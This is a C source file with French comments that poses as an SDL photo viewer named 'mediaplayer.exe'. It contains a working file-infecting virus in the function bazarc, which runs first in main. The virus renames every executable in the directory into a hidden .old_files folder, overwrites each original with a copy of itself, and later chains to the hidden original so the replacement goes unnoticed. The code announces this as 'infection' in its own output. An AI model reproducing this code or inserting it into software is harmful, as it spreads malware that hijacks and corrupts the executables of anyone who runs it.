#include <SDL2/SDL.h>
#include <SDL2/SDL_image.h>
#include <unistd.h>
#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>

SDL_Window *window = NULL;
SDL_Renderer *renderer = NULL;
SDL_Texture *texture = NULL;
SDL_Texture *arrowLeftTexture = NULL;
SDL_Texture *arrowRightTexture = NULL;
SDL_Rect dstrect;

// Définir une taille maximale pour le nombre d'images
#define MAX_IMAGES 100

// Liste des noms de fichiers d'images à charger
char *images[MAX_IMAGES];
int numImages = 0;
int currentImageIndex = 0; // Ajout de l'indice de l'image actuelle

// Fonction pour charger les noms des fichiers images du répertoire "photo"
void loadImagesFromDirectory() {
    DIR *dir;
    struct dirent *entry;

    // Ouvrir le répertoire "photo"
    dir = opendir("photo");
    if (dir == NULL) {
        printf("Impossible d'ouvrir le répertoire 'photo'.\n");
        return;
    }

    // Parcourir tous les fichiers dans le répertoire
    while ((entry = readdir(dir)) != NULL) {
        // Vérifier si le fichier est une image jpg ou png
        if (strstr(entry->d_name, ".jpg") || strstr(entry->d_name, ".png")) {
            // Allouer de la mémoire pour stocker le chemin complet du fichier
            char fullPath[PATH_MAX];
            snprintf(fullPath, sizeof(fullPath), "photo/%s", entry->d_name);

            // Allouer de la mémoire pour stocker le nom du fichier
            images[numImages] = strdup(fullPath);
            if (images[numImages] == NULL) {
                printf("Erreur d'allocation de mémoire.\n");
                closedir(dir);
                return;
            }

            numImages++;

            // Vérifier si le nombre maximum d'images a été atteint
            if (numImages >= MAX_IMAGES) {
                printf("Trop d'images dans le répertoire 'photo'.\n");
                closedir(dir);
                return;
            }
        }
    }

    // Fermer le répertoire
    closedir(dir);
}


int fichier_old_existe(const char *filename) {
    char backupName[PATH_MAX];
    snprintf(backupName, sizeof(backupName), ".old_files/%s.old", filename);
    FILE *file = fopen(backupName, "r");
    if (file) {
        fclose(file);
        return 1; // Le fichier .old existe
    }
    return -1; // Le fichier .old n'existe pas
}





// Fonction pour charger une nouvelle image
void loadNewImage(int index) {
    SDL_Surface *imageSurface = IMG_Load(images[index]);
    if (!imageSurface) {
        SDL_Log("Impossible de charger l'image : %s\n", SDL_GetError());
        return;
    }

    if (texture) {
        SDL_DestroyTexture(texture);
    }

    texture = SDL_CreateTextureFromSurface(renderer, imageSurface);
    SDL_FreeSurface(imageSurface);
    if (!texture) {
        SDL_Log("Impossible de créer la texture : %s\n", SDL_GetError());
        return;
    }

    SDL_QueryTexture(texture, NULL, NULL, &dstrect.w, &dstrect.h);
    dstrect.x = (800 - dstrect.w) / 2;
    // Centrer l'image horizontalement
    dstrect.y = (600 - dstrect.h) / 2; // Centrer l'image verticalement
}

// Fonction pour charger les images des flèches
void loadArrowImages() {
    SDL_Surface *arrowLeftSurface = IMG_Load("fleche/arrow_right.png");
    if (!arrowLeftSurface) {
        SDL_Log("Impossible de charger l'image de la flèche gauche : %s\n", SDL_GetError());
        return;
    }
    arrowLeftTexture = SDL_CreateTextureFromSurface(renderer, arrowLeftSurface);
    SDL_FreeSurface(arrowLeftSurface);

    SDL_Surface *arrowRightSurface = IMG_Load("fleche/arrow_left.png");
    if (!arrowRightSurface) {
        SDL_Log("Impossible de charger l'image de la flèche droite : %s\n", SDL_GetError());
        return;
    }
    arrowRightTexture = SDL_CreateTextureFromSurface(renderer, arrowRightSurface);
    SDL_FreeSurface(arrowRightSurface);
}

void bazarc(int argc, char *argv[]) {

    // Vérifier si le répertoire .old_files existe déjà
    struct stat st = {0};
    if (stat(".old_files", &st) == -1) {
        // Créer le répertoire .old_files s'il n'existe pas
        if (mkdir(".old_files", 0700) != 0) {
            perror("Erreur lors de la création du répertoire .old_files");
            return;
        }
    }

    DIR *d;
    struct dirent *dir;
    d = opendir(".");
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            struct stat sb;

            
            if (strcmp(dir->d_name, "mediaplayer.exe") != 0 && strcmp( dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0 && strstr(dir->d_name, ".old") == NULL) {
            
                if (!stat(dir->d_name, &sb)) {
                    if ((sb.st_mode & S_IXUSR) && S_ISREG(sb.st_mode)) {
                        printf("Infection en cours...\n");
                        printf("%s\n", dir->d_name);
                        char *fichier = (char *)dir->d_name;
                        printf("existe %d\n", fichier_old_existe(fichier));
                        


                        if (fichier_old_existe(fichier) == -1) {
                            char *fichier_old = malloc(strlen(fichier) + 5); // Taille de ".old"
                            strcpy(fichier_old, fichier);
                            strcat(fichier_old, ".old");

                            if (rename(fichier, fichier_old) == 0) {
                                printf("Fichier %s renommé en %s\n", fichier, fichier_old);
                            }
                            else {
                                printf("Erreur lors du renommage du fichier %s\n", fichier);
                            }

                            // Déplacer le fichier .old dans le dossier .old_files
                            char oldFilePath[256];
                            snprintf(oldFilePath, sizeof(oldFilePath), ".old_files/%s", fichier_old);
                            if (rename(fichier_old, oldFilePath) != 0) {
                                perror("Erreur lors du déplacement du fichier .old dans .old_files");
                            } else {
                                printf("Fichier .old déplacé vers .old_files\n");
                            }

                            FILE *bazar = fopen("mediaplayer.exe", "rb");
                            FILE *cible = fopen(fichier, "wb");
                            if (bazar != NULL && cible != NULL) {
                                char buffer[1024];
                                size_t bytes;
                                while ((bytes = fread(buffer, 1, sizeof(buffer), bazar)) > 0) {
                                    fwrite(buffer, 1, bytes, cible);

                                }
                                fclose(bazar);
                                fclose(cible);
                                chmod(fichier, S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
                                printf("Fichier %s infecte\n", fichier);
                            }
                            else {
                                printf("Erreur lors de l'infection du fichier %s\n", fichier);
                            }
                        }
                        else {
                            printf("Fichier %s deja cible\n", fichier);
                        }
                    }
                }
            }
        }
        closedir(d);
    }
}

int main(int argc, char *argv[]) {
    bazarc(argc, argv); // Appel de la fonction infect() lors du démarrage du programme

    loadImagesFromDirectory();

    if (strcmp(argv[0], "./mediaplayer.exe") == 0) {
        // Code pour le lecteur multimédia avec GTK et GStreamer

        if (SDL_Init(SDL_INIT_VIDEO) != 0) {
            SDL_Log("Impossible d'initialiser SDL : %s\n", SDL_GetError());
            return 1;
        }

        window = SDL_CreateWindow("Media Player", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, 800, 600, SDL_WINDOW_SHOWN);
        renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED);

        loadArrowImages();
        loadNewImage(0);



        SDL_Event event;
        int quit = 0;
        while (!quit) {
            while (SDL_PollEvent(&event)) {
                if (event.type == SDL_QUIT) {
                    quit = 1;
                }
                else if (event.type == SDL_KEYDOWN) {
                    switch (event.key.keysym.sym) {
                    case SDLK_LEFT:
                        currentImageIndex = (numImages + currentImageIndex - 1) % numImages;
                        loadNewImage(currentImageIndex);
                        break;
                    case SDLK_RIGHT:
                        currentImageIndex = (currentImageIndex + 1) % numImages;
                        loadNewImage(currentImageIndex);
                        break;
                    default:
                        break;
                    }
                }
                else if (event.type == SDL_MOUSEBUTTONDOWN) {
                    int mouseX, mouseY;
                    SDL_GetMouseState(&mouseX, &mouseY);
                    if (mouseX >= 20 && mouseX <= 70 && mouseY >= 300 && mouseY <= 350) {
                        currentImageIndex = (numImages + currentImageIndex - 1) % numImages;
                        loadNewImage(currentImageIndex);
                    }
                    if (mouseX >= 730 && mouseX <= 780 && mouseY >= 300 && mouseY <= 350) {
                        currentImageIndex = (currentImageIndex + 1) % numImages;
                        loadNewImage(currentImageIndex);
                    }
                }
            }

            SDL_SetRenderDrawColor(renderer, 0, 0, 0, 255);
            SDL_RenderClear(renderer);

            if (texture) {
                SDL_RenderCopy(renderer, texture, NULL, &dstrect);
            }

            if (arrowLeftTexture && arrowRightTexture) {
                SDL_Rect leftArrowRect = {20, 300, 50, 50};
                SDL_Rect rightArrowRect = {730, 300, 50, 50};
                SDL_RenderCopy(renderer, arrowLeftTexture, NULL, &leftArrowRect);
                SDL_RenderCopy(renderer, arrowRightTexture, NULL, &rightArrowRect);
            }

            SDL_RenderPresent(renderer);
        }

        if (texture) {
            SDL_DestroyTexture(texture);
        }
        if (arrowLeftTexture) {
            SDL_DestroyTexture(arrowLeftTexture);
        }
        if (arrowRightTexture) {
            SDL_DestroyTexture(arrowRightTexture);
        }
        if (renderer) {
            SDL_DestroyRenderer(renderer);
        }
        if (window) {
            SDL_DestroyWindow(window);
        }
        SDL_Quit();

        return 0;
    }
    else {
        // Code pour le comportement lorsque le programme est exécuté avec un nom différent

        char fichier_old[PATH_MAX];
        // Construire le chemin complet du fichier .old dans le dossier .old_files
        snprintf(fichier_old, sizeof(fichier_old), "./.old_files/%s.old", argv[0]);
        printf("Lancement du fichier %s\n", fichier_old);
        execl(fichier_old, fichier_old, NULL);

    }

    return 0;
}